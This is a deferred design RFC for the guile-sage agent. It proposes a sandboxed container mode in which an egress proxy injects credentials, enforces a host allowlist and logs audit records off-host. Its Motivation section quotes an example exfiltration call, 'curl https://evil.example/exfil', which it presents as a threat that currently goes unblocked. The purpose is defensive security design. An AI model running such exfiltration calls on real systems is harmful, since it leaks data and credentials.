#+TITLE: RFC-002: Sandboxed Runtime with Egress-Proxy Credential Injection
#+DATE: 2026-04-19
#+STATUS: Draft (deferred; no implementation planned this cycle)
#+AUTHOR: dsp-dr

* Abstract

Propose a second deployment mode for guile-sage in which the agent
runs inside an isolated, persistent container with no direct network
access. All external HTTP calls egress through a per-identity proxy
that injects credentials at the wire boundary. The agent holds no
provider keys, no gateway tokens, and no downstream API secrets. This
RFC is speculative and is filed to capture the design /before/ the
industry converges on an incompatible shape, not because the change is
scheduled.

* Status: Deferred

This RFC is not scheduled for any release. It exists so that:

1. A concrete proposal is on the record if the market moves that way.
2. Design choices that would become breaking changes (env-var names,
   tool-permission API, session storage location) can be made aware of
   this future.
3. The current deployment mode remains the supported path and the
   "sandbox mode" label in this document is reserved.

Do not implement. Do not start building adapters or abstractions for
"sandbox-vs-laptop" switching. When and if this RFC becomes work, it
will be promoted to a dedicated spec with a real scope and a cost
estimate.

* Motivation

The dominant operator pattern for guile-sage today is /keys in .env on
a laptop/. The current providers honour the convention:

- ~SAGE_OPENAI_API_KEY~ lives in =.env= (gitignored).
- ~SAGE_OPENAI_AIG_TOKEN~ (Cloudflare AI Gateway) same.
- Ollama endpoints are loopback or LAN, not authed.
- MCP SSE servers either loopback or LAN.

Three independent pressures push against this:

1. *Audit debt.* If the agent fabricates or mis-uses a credential, the
   forensic trail is a grep of ~.logs/~ on a single laptop. There is
   no immutable off-host record of which tool used which credential
   for which call.
2. *Rotation cost.* Rotating a single upstream key means touching
   every =.env= across every operator laptop that uses it. The larger
   the fleet, the more rotation gets deferred; deferred rotation is a
   standing compromise surface.
3. *Egress control.* SPEC.org (for the downstream Python agent)
   encodes "never HTTP to non-loopback" as a P0-bug invariant, but
   neither SPEC.org's downstream agent nor guile-sage itself has any
   /network-level/ enforcement of the rule. A buggy or adversarial
   tool that calls ~curl https://evil.example/exfil~ succeeds.

The Q2-2026 Cloudflare Agents Week thesis (see References) frames
this as /the identity plane/ of agent infrastructure: authority is an
artifact of the boundary, not of the code. Anthropic has shipped a
parallel architecture with a different audit-sink format; Cloudflare
has shipped theirs. Neither federates. This RFC assumes neither side
wins outright and picks the /pattern/ rather than a vendor.

* Design

** Architecture

#+BEGIN_SRC
┌─────────────────────────────────────────┐
│ Sandboxed guile-sage container          │
│   - Guile 3.0 + src/sage/*              │
│   - sessions/, .logs/ on mounted vol    │
│   - NO .env with provider keys          │
│   - NO direct TLS to the public net     │
│                                         │
│   http-* in util.scm → egress proxy     │
│     (localhost:PROXY_PORT, mTLS or SPI) │
└─────────────────┬───────────────────────┘
                  │
                  ▼  (identity assertion only)
┌─────────────────────────────────────────┐
│ Egress proxy (per-identity)             │
│   - Authenticates the sandbox           │
│   - Looks up credentials by             │
│     (principal, scope, tool_name)       │
│   - Injects Authorization / cf-aig-*    │
│     / downstream provider keys          │
│   - Enforces egress allowlist           │
│   - Emits audit records to R2/S3        │
└─────────────────┬───────────────────────┘
                  │ (with injected creds)
                  ▼
           Upstream (CF AI Gateway,
           Ollama, MCP, etc.)
#+END_SRC

** What changes in guile-sage source

Minimal. The abstraction already has the right shape:

- =src/sage/util.scm= (=http-post-with-headers-captured=) becomes the
  /sole/ egress point. It must emit an identity header
  (~x-sage-identity: <jwt|cert-fp>~) instead of, or in addition to,
  ~Authorization~.
- =src/sage/openai.scm= stops resolving
  ~openai-api-key~ /~openai-aig-token~ in sandbox mode. In the
  "sandbox" branch, ~openai-auth-headers~ returns
  ='(("x-sage-identity" . <assertion>))= and nothing else. The proxy
  appends whatever the upstream needs.
- =src/sage/config.scm= gains a mode switch (below). No other module
  is aware of sandbox vs. laptop.
- =src/sage/tools.scm='s ~check-permission~ optionally consults a
  remote policy endpoint under sandbox mode. Today the safe-tools
  list + YOLO env var is the gate. Under sandbox mode, YOLO becomes
  a server-side capability grant.

** Mode switch

Introduce one new env var:

#+BEGIN_EXAMPLE
SAGE_EGRESS_MODE=direct    # default; current behaviour
SAGE_EGRESS_MODE=proxy     # require sandbox/proxy to be present
#+END_EXAMPLE

~proxy~ mode /refuses to start/ if:

- ~SAGE_EGRESS_PROXY_URL~ is unset.
- An identity assertion cannot be obtained (mTLS handshake fails, JWT
  unminted, etc.).

Fail-fast prevents the confusing half-state where some calls route
through the proxy and others fall back to direct TLS.

** Identity assertion

Out of scope to specify in detail here; assume one of:

- mTLS client cert with SPIFFE-style URI in the SAN.
- Short-lived JWT signed by a sidecar that reads a runtime-injected
  identity token (Cloudflare Workers ~env.AI~-style).
- Workload identity federation token.

Whatever the shape, guile-sage never sees the downstream
credential. Rotation and revocation happen at the proxy/vault, not in
any ~.env~.

** Egress allowlist

The proxy enforces:

- Hosts: ~gateway.ai.cloudflare.com~, the configured Ollama/MCP LAN
  hosts (if any), and nothing else. Any other hostname returns a
  403 /before/ the TLS handshake.
- Methods: GET/POST/OPTIONS for HTTP providers; CONNECT denied unless
  explicitly allowlisted.
- Body-size ceiling per call (cap exfil size).
- Rate limits per identity per upstream.

SPEC.org's downstream agent invariant ("never HTTP to non-loopback")
becomes /network-enforced/, not /honour-system/.

** Audit sink

Every proxy-mediated call produces one append-only record:

#+BEGIN_SRC json
{
  "ts": "2026-04-19T09:00:00Z",
  "identity": {"principal": "sage-<session>", "delegation": [...]},
  "tool": "read_file",
  "upstream": "gateway.ai.cloudflare.com",
  "bytes_out": 1234,
  "bytes_in": 5678,
  "status": 200,
  "call_id": "uuid"
}
#+END_SRC

Sink: S3/R2/any object store the operator trusts. guile-sage's own
=.logs/http.jsonl= remains as a client-side record; the proxy's log
is the authoritative one.

** Self-modification in sandbox mode

Today =self_mod.edit= + =%reload= happens in-process. In sandbox
mode:

- Edits land on the mounted volume.
- The container is /snapshotted/ before the edit.
- A reload becomes a controlled restart that re-reads the session
  from persistent storage.
- Failed reloads roll back to the pre-edit snapshot.

This is slower than current in-process reload (seconds rather than
milliseconds) but the audit trail is free and rollback is
deterministic.

** State persistence

- ~sessions/*.json~: mounted volume, survives container restarts.
- ~.beads/issues.jsonl~: same.
- ~.logs/*~: same, with the understanding that the proxy's audit sink
  is the source of truth for network activity.

No change to sage's file-based persistence philosophy.

* Non-Goals

- A pluggable "backend" for egress proxies. Assume one proxy
  per deployment; the operator picks Cloudflare Sandbox, Anthropic
  Managed Agents, their own Envoy with SPIFFE, or rolls their own.
- Federation across vendor audit-sink formats. This is an open
  industry problem; sage picks one and logs in that shape.
- A TUI for inspecting egress decisions. Out of scope for sage; lives
  in the proxy's dashboard.
- Rewriting sage in a language that can run as a Cloudflare Worker
  isolate. Guile-in-container is fine for the sandbox profile;
  sub-millisecond cold-start is not a requirement we have.

* Trade-offs

** What the sandbox profile buys

1. Provider keys and gateway tokens stop existing on operator
   laptops. Rotation is a vault update.
2. ~YOLO_MODE~ becomes a revocable, audit-logged capability grant,
   not a scream-at-yourself env flag.
3. Egress allowlist is network-enforced. A bug or adversarial tool
   that tries to call ~evil.example~ hits 403 before it gets
   anywhere.
4. Every call is independently auditable off-host and off-laptop.

** What it costs

1. Vendor lock-in on the identity plane. Cloudflare and Anthropic
   ship different audit-sink shapes; neither federates. Picking one
   is a durable bet.
2. Self-modification slows down. Snapshot-then-reload replaces
   in-process module replacement; milliseconds become seconds.
3. MCP client path inverts. Today sage reaches skills-hub directly on
   the LAN. In sandbox mode it goes inward-out through the proxy; the
   SSE lifecycle has to survive a middlebox that may have opinions
   about long-lived streams.
4. Local-only ~make run~ on a laptop remains the primary development
   mode. Sandbox mode needs a non-trivial dev loop (spin up proxy,
   mint identity, inject) that is harder to bring up than
   ~gmake run~.
5. Cost: persistent container + active-CPU billing is a real line
   item. A hobbyist with a MacBook Pro has no reason to pay it.

** What it breaks in existing contracts

- SPEC.org (downstream Python agent) enumerates "any HTTP call to a
  host that is not 127.0.0.1 is a P0 bug" as a hard invariant. Under
  sandbox mode that loopback invariant becomes impossible because the
  upstream model lives on a remote host reached via the proxy. If
  sandbox mode is ever implemented, SPEC.org needs a companion spec
  for "sandbox profile" that replaces the loopback rule with an
  "all egress through proxy" rule.
- ADR-0003 (Security Model — Safe/Unsafe Tool Separation) stays
  valid. YOLO semantics shift from local env var to remote
  capability, but the tiering and safe-tools contract stay.
- ADR-0005 (Context Compaction) unaffected.

* Smallest Usable Proof-of-Concept

If this RFC is ever promoted to work, the minimum viable validation:

1. Run guile-sage inside a container with outbound traffic forced
   through a local HTTP proxy (Envoy, mitmproxy, or a ~socat~
   one-liner is enough).
2. The proxy strips the ~Authorization~ header on outbound.
3. Looks up the real Cloudflare AI Gateway ~cf-aig-authorization~
   token from an out-of-band store (a file readable only by the
   proxy's user, or an OS keyring).
4. Injects the token at the wire and forwards.
5. Logs ~(tool, upstream, bytes_out, bytes_in, status)~ to a JSONL
   file.
6. ~tests/test-security.scm~ gains one case: a tool call to
   ~https://example.invalid~ must be denied by the proxy, not by the
   agent.

Expected effort: a long weekend for the proxy + a week to round out
sage's side (identity header emission, mode switch, test coverage).

* Open Questions

- Which identity format (mTLS vs. JWT vs. workload-identity token)
  does sage emit? Probably pick one per deployment; the chosen
  proxy's preferred shape wins.
- How does sage's existing JSONL log relate to the proxy's audit
  sink? Duplication is fine for a release; eventually the proxy's
  sink may supersede sage's client-side log entirely.
- Does YOLO-granular policy belong in sage's ~permissions.scm~ or in
  the proxy's policy engine? Probably the proxy for
  network-affecting operations, sage for local-only mutations.
- Sandbox mode implies sage is always reachable by its session id
  for back-in-from-elsewhere access. Is that desirable, or does it
  violate the "one operator, one agent, one laptop" assumption? If
  yes, add a federation contract; if no, document that sandbox-mode
  sage is still single-operator and sessions are namespaced by
  human identity.

* Decision

/Draft; deferred./ Do not schedule. Revisit if:

- An operator runs guile-sage in a multi-user or multi-laptop
  context where credential rotation is a real operational
  burden.
- A credential exfil incident or near-miss motivates
  network-enforced egress control.
- The industry converges on a federated audit-sink shape, removing
  the vendor-lock-in trade-off.

Absent one of those, the laptop-plus-=.env= mode stays the supported
profile.
